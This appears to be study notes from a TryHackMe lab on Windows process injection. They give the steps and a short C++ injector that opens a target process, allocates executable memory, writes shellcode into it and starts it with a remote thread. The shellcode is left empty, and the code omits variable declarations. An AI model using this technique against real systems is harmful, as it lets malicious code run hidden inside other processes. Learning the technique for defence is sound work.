# Shellcode Injection

#### Shellcode Injection Steps

Windows API calls interact with process memory steps that diverge to `Malicious Memory Region`:
1.  Open a target process with all access rights.
2.  Allocate target process memory for the shellcode.
3.  Write shellcode to allocated memory in the target process.
4.  Execute the shellcode using a remote thread.

1. Malicious Process
	1. Open Process - Open a target process with all access rights.
		1. Process
			1. DLLs
			2. Registers
			3. Process Heap
			4. Thread Stack
				1. CreateRemoteThread
				2. Malicious Memory Region -> Execute the shellcode using a remote thread.
			5. Process Memory
			6. Malicious Memory Region -> Execute the shellcode using a remote thread.
	2. VirtualAlloc - Allocate target process memory for the shellcode.
		1. WriteProcessMemory -> Write shellcode to allocated memory in the target process.
			1. Malicious Memory Region -> Execute the shellcode using a remote thread.

Basic Process Injector:
```cpp
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
// Open a target process with all access rights
processHandle = OpenProcess(
	PROCESS_ALL_ACCESS, // Defines access rights
	FALSE, // Target handle will not be inhereted
	DWORD(atoi(argv[1])) // Local process supplied by command-line arguments 
);

// Allocate target process memory for the shellcode
remoteBuffer = VirtualAllocEx(
	processHandle, // Opened target process
	NULL, 
	sizeof shellcode, // Region size of memory allocation
	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
);

// Write shellcode to allocated memory in the target process
WriteProcessMemory(
	processHandle, // Opened target process
	remoteBuffer, // Allocated memory region
	shellcode, // Data to write
	sizeof shellcode, // byte size of data
	NULL
);

// Execute the shellcode using a remote thread
remoteThread = CreateRemoteThread(
	processHandle, // Opened target process
	NULL, 
	0, // Default size of the stack
	(LPTHREAD_START_ROUTINE)remoteBuffer, // Pointer to the starting address of the thread
	NULL, 
	0, // Ran immediately after creation
	NULL
);
}
```

## References

[THM Abusing Window Internals](https://tryhackme.com/room/abusingwindowsinternals)